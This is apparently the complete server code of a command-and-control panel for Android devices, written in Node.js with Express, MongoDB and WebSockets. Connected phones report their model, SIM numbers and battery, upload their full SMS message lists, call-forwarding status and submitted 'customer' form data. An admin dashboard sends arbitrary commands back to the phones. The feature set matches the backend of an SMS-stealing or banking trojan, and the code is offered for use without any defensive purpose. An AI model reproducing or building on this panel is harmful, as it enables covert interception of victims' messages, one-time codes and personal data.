require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

const MONGO_URI = process.env.MONGO_URI || '';
if (!MONGO_URI) { console.error('MONGO_URI missing'); process.exit(1); }
mongoose.set('bufferCommands', false);
mongoose.connect(MONGO_URI, {
  serverSelectionTimeoutMS: 5000,
  connectTimeoutMS: 10000,
  socketTimeoutMS: 45000,
  maxPoolSize: 10,
  writeConcern: { w: 1 }
}).then(() => console.log('MongoDB connected')).catch(err => { console.error('Mongo connect error', err); process.exit(1); });

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true, unique: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: Number,
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: Boolean,
  registrationTimestamp: Date,
  customerData: mongoose.Schema.Types.Mixed,
  isDeleted: { type: Boolean, default: false },
  smsMessages: Array
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map();

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

// --- API Routes ---
app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (username === 'admin' && password === adminPassword) {
    return res.json({ success: true });
  }
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

app.post('/api/change-password', (req, res) => {
    const { oldPassword, newPassword } = req.body || {};
    if (!oldPassword || !newPassword) return res.status(400).json({ success: false, message: 'Missing fields' });
    if (oldPassword !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong Old Password' });
    adminPassword = newPassword;
    console.log('Admin password changed.');
    return res.json({ success: true, message: 'Password changed successfully' });
});

app.get('/api/devices', async (req, res) => {
  try {
    const list = await Device.find({ isDeleted: { $ne: true } }).lean();
    const now = Date.now();
    // Mark devices as offline if not seen in the last 60 seconds
    list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
    res.json(list);
  } catch (err) { console.error('Error fetching devices:', err); res.status(500).json({ error: 'Failed to fetch devices' }); }
});

app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
    const result = await Device.findOneAndUpdate({ deviceId }, { $set: { isDeleted: true, isOnline: false } });
    if (!result) return res.status(404).json({ success: false, message: 'Device not found' });
    
    // Disconnect any active WebSocket connections for this device
    const clients = global.deviceSockets.get(deviceId);
    if (clients) {
        clients.forEach(client => client.terminate());
        global.deviceSockets.delete(deviceId);
    }
    
    io.emit('dashboard-update');
    return res.json({ success: true, message: 'Device deleted successfully' });
  } catch (err) { console.error('Error deleting device:', err); return res.status(500).json({ success: false, message: 'Server error' }); }
});

app.post('/api/pin-device', async (req, res) => {
  try {
    const { deviceId, status } = req.body || {};
    if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
    const d = await Device.findOneAndUpdate({ deviceId }, { $set: { isPinned: !!status } });
    if (!d) return res.status(404).json({ success: false, message: 'Device not found' });
    io.emit('dashboard-update');
    return res.json({ success: true, message: status ? 'Device pinned' : 'Device unpinned' });
  } catch (e) { console.error('Error pinning device:', e); return res.status(500).json({ success: false, message: 'Server error' }); }
});

app.post('/api/command', async (req, res) => {
  try {
    const { deviceId, action, data } = req.body || {};
    if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing deviceId or action' });
    
    const clients = global.deviceSockets.get(deviceId);
    if (!clients || clients.size === 0) {
        return res.status(404).json({ success: false, message: 'Device not connected' });
    }

    let sentCount = 0;
    const commandPayload = JSON.stringify({ command: action, data });
    clients.forEach((client) => {
      try {
        if (client.readyState === WebSocket.OPEN) {
          client.send(commandPayload);
          sentCount++;
        }
      } catch (e) { console.error('WS send error:', e && e.message); }
    });

    if (sentCount === 0) return res.status(404).json({ success: false, message: 'Device not connected' });
    
    return res.json({ success: true, message: 'Command sent successfully' });
  } catch (err) { console.error('Command API error:', err); return res.status(500).json({ success: false, message: 'Server error' }); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/health', (req, res) => res.json({ status: 'ok' }));

server.on('upgrade', (req, socket, head) => {
  if (req.url && req.url.startsWith('/socket.io')) return;
  wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); });
});

// --- WebSocket Handlers for Device Connections ---
wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });

  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);
      const id = data.deviceId;

      // Handle device registration and updates
      if (id) {
        ws.deviceId = id;
        if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
        global.deviceSockets.get(id).add(ws);

        const update = { $set: { isOnline: true, lastSeen: new Date() } };
        if (data.model) update.$set.model = data.model;
        if (data.androidVersion) update.$set.androidVersion = data.androidVersion;
        if (data.sim1) update.$set.sim1 = data.sim1;
        if (data.sim2) update.$set.sim2 = data.sim2;
        if (data.battery !== undefined) update.$set.battery = Number(data.battery) || 0;

        await Device.findOneAndUpdate({ deviceId: id }, { ...update, $setOnInsert: { deviceId: id, registrationTimestamp: new Date() } }, { upsert: true });
        io.emit('dashboard-update');
      }

      // **UPDATED**: Handle SMS list from device and notify dashboard specifically
      if (data.type === 'SMS_LIST' && id && Array.isArray(data.messages)) {
        await Device.findOneAndUpdate({ deviceId: id }, { $set: { smsMessages: data.messages } });
        io.emit('sms-list-update', { deviceId: id, messages: data.messages });
      }
      
      // **NEW**: Handle call forward status from device and relay to dashboard
      if (data.type === 'CALL_FORWARD_STATUS_RESULT' && id && data.status) {
          io.emit('call-forward-status-update', { deviceId: id, status: data.status });
      }

      if (data.type === 'FORM_SUBMIT' && id && data.data) {
        await Device.findOneAndUpdate({ deviceId: id }, { $set: { customerData: data.data, lastSeen: new Date() } });
        io.emit('dashboard-update');
      }
    } catch (e) { console.error('ws message processing error', e && e.message); }
  });

  ws.on('close', async () => {
    if (ws.deviceId) {
      const clients = global.deviceSockets.get(ws.deviceId);
      if (clients) {
        clients.delete(ws);
        if (clients.size === 0) {
            global.deviceSockets.delete(ws.deviceId);
            // Update device status to offline in DB when last socket closes
            await Device.findOneAndUpdate({ deviceId: ws.deviceId }, { $set: { isOnline: false } });
            io.emit('dashboard-update');
        }
      }
    }
  });

  ws.on('error', (err) => console.error('WS client error:', err && err.message));
});

// Heartbeat to clean up dead connections
const heartbeat = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    try { ws.ping(); } catch (e) { /* ignore ping error */ }
  });
}, 30000);

io.on('connection', (socket) => {
  console.log('Dashboard client connected');
  socket.on('disconnect', () => console.log('Dashboard client disconnected'));
});

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  clearInterval(heartbeat);
  server.close(() => {
    mongoose.connection.close(false, () => process.exit(0));
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server listening on port ${PORT}`));